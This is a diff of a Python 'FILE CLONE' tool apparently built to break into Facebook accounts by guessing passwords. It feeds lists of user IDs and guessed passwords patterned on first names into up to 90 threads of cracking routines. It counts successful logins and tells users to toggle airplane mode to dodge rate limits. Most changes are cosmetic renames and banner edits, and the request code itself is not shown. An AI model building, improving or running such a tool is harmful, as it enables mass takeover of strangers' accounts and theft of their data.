@@ -39,7 +39,7 @@ from urllib.request import Request, urlopen
 import os, requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, re, json, uuid, \
     subprocess, shutil, webbrowser, time, json, sys, random, datetime, time, re, subprocess, platform, string, json, \
     time, re, random, sys, string, uuid
-from concurrent.futures import ThreadPoolExecutor as Habib
+from concurrent.futures import ThreadPoolExecutor as inc3
 from string import *
 from random import randint
 from time import sleep as slp
@@ -169,10 +169,9 @@ logo = f"""
 {white} X X  B   B O   O W     W
 {white}  X   BBBB  O   O W  W  W
 {white} X X  B   B O   O  W W W
-{white}X   X BBBB   OOO    W W
+{white}X   X BBBB   OOO    W W           {green}v0
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-{white}[{green}◆{white}] {white}FACEBOOK  {white} 
-{white}[{green}◆{white}] {white}TOOL  {white}➣{green}  FREE{white}{red}┼{faltu}{red}FILE Cloning{pvt}{green}{red}┼ 
+{white}[{green}◆{white}] {white}FACEBOOK {white}➣{white}   ({green}clone.inception{white})
 {white}[{green}◆{white}] {white}GITHUB    {white}➣{white}   ({gren}xbow-570{white})
 {white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
@@ -193,8 +192,8 @@ def result(OKs, cps):
 def menu():
     clear()
     print(f'[{white}1] {green}START FILE CLONE{white}')
-    print(f'[{white}2] JOIN WHATSAPP GROUP')
-    print(f'[{white}3] CONTACT TOOL ADMIN')
+    print(f'[{white}2] JOIN MESSENGER GROUP')
+    print(f'[{white}3] CONTACT TOOL AUTHOR')
     print(f'[{white}0] {red}EXIT TOOL  ')
     linex()
     select = input(f'{white}[{green}◆{white}] {white}CHOICE OPTION {white}➣{green} ')
@@ -344,7 +343,7 @@ class main_crack():
         try:
             global oks, cps, loop
             sys.stdout.write(
-                f"\r{red}[{green}xbow-M2{red}]{white}-{red}[{gren}{loop}{red}]{white}-{red}[{green}OK{red}]{white}-{red}[{green}{len(oks)}{red}] ")
+                f"\r{white}[{white}xbow-M2{white}]{white}-{white}[{white}{loop}{white}]{white}-{white}[{green}OK-{len(oks)}{white}] ")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -413,7 +412,7 @@ class main_crack():
             loop += 1
         except requests.exceptions.ConnectionError:
             time.sleep(10)
-            self.methodC(sid, name, ps)
+            self.methodB(sid, name, ps)
 
         # __________________[ PASSWORD ]__________________#
 
@@ -422,7 +421,7 @@ class main_crack():
         clear()
         print(f'{white}[{red}◆{white}] {red}Password Limit Should Be Not Greater Than 20!');
         linex()
-        sl = int(input(f'{white}[{green}◆{white}] {white}Input Password Limit {green}➣{green} '))
+        sl = int(input(f'{white}[{green}◆{white}] {white}Input Password Limit {white}➣{white} '))
         clear()
         print(f'{white}[{green}◆{white}] {white}EXAMPLE {white}➣{white} First123/first12/77889900')
         linex()
@@ -434,10 +433,10 @@ class main_crack():
             for sr in range(sl):
                 pw.append(input(f'{white}[{green}◆{white}] {white}Password {white}{sr + 1} {white}➣{white} '))
         clear()
-        print(f'{white}[{green}◆{white}] {white}TOTAL UID  {white}➣{white} %s ' % len(self.id))
-        print(f'{white}[{green}◆{white}] {white}Use Automate 1M/3S Airplane Flow')
+        print(f'{white}[{green}◆{white}] {white}TOTAL UID  {white}➣{green} %s ' % len(self.id))
+        print(f'{white}[{green}◆{white}] {white}Use Automate {green}1M/3S{green} {white}Airplane Flow')
         linex()
-        with Habib(max_workers=90) as AJworld:
+        with inc3(max_workers=90) as NOX:
             for zsb in self.id:
                 try:
                     uid, name = zsb.split('|')
@@ -447,11 +446,11 @@ class main_crack():
                     else:
                         pwx = pw
                         if 'methodA' in methods:
-                            AJworld.submit(self.methodA, uid, name, pwx)
+                            NOX.submit(self.methodA, uid, name, pwx)
                         elif 'methodB' in methods:
-                            AJworld.submit(self.methodB, uid, name, pwx)
+                            NOX.submit(self.methodB, uid, name, pwx)
                         elif 'methodC' in methods:
-                            AJworld.submit(self.methodC, uid, name, pwx)
+                            NOX.submit(self.methodC, uid, name, pwx)
                 except:
                     pass
         result(oks, cps)
